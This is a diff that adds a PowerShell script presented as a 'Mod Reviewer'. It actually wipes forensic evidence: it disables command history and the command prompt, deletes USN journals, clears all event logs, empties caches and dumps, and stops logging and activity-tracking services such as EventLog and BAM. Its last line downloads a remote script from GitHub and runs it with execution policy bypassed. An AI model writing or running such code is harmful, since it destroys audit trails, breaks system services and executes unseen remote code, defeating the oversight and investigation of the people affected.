@@ -1,2 +1,74 @@
+# Template
+Write-Host "Mod Reviewer by NameLessF0" -ForegroundColor Black
+Write-Host "GitHub: https://github.com/NameLessF0" -ForegroundColor White
+Write-Host "Discord: https://discord.gg/k7hcQKRXQt" -ForegroundColor Blue
+Write-Host "`nRunning the script..." -ForegroundColor Red
+
+# PowerShell Logging
+Set-PSReadLineOption -HistorySaveStyle SaveNothing
+
+# Command Prompt Toggle
+New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\System" -Force | Out-Null
+New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 1 -PropertyType DWORD -Force
+
+# Deleting USNJournal
+"C:", "D:" | ForEach-Object {
+    Write-Host "Deleting and disabling USN Journal on drive: $_" -ForegroundColor Cyan
+    fsutil usn deletejournal /d /n $_
+}
+
+
+# Event Logs
+Get-WinEvent -ListLog * | ForEach-Object {
+    try {
+        [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)
+    } catch {}
+}
+
+# Temp
+Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+# Windows Update download cache
+Stop-Service wuauserv -Force -ErrorAction SilentlyContinue
+Remove-Item "C:\Windows\SoftwareDistribution\Download\*" -Recurse -Force -ErrorAction SilentlyContinue
+Start-Service wuauserv -ErrorAction SilentlyContinue
+
+# Delivery Optimization cache
+Delete-DeliveryOptimizationCache -Force -ErrorAction SilentlyContinue
+
+# Recycle Bin - C and D
+Clear-RecycleBin -DriveLetter C,D -Force -ErrorAction SilentlyContinue
+
+# Crash dumps
+Remove-Item "C:\Windows\Minidump\*" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "C:\Windows\MEMORY.DMP" -Force -ErrorAction SilentlyContinue
 # Services
 ## PcaSvc
+Stop-Service PcaSvc -Force
+## Eventviewer
+Stop-Service EventLog -Force
+## Task Scheduler
+Stop-Service Schedule -Force
+## Sysmain
+Stop-Service Sysmain -Force
+## BAM
+Stop-Service BAM -Force
+## DPS
+Stop-Service DPS -Force
+## Searchindexer
+Stop-Service WSearch -Force
+## DCOMLaunch
+Stop-Service DCOMLAUNCH -Force
+## Plug and Play
+Stop-Service PlugPlay -Force
+## CDPSvc
+Stop-Service CDPSvc -Force
+## Appinfo
+Stop-Service Appinfo -Force
+## Dusmsvc
+Stop-Service Dusmsvc -Force
+
+## End part
+Write-Host "The tasks are finished... Reviewing..." -ForegroundColor Green
+powershell -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/NameLessF0/Service-Checker/refs/heads/main/Service-Checker.ps1 | iex"
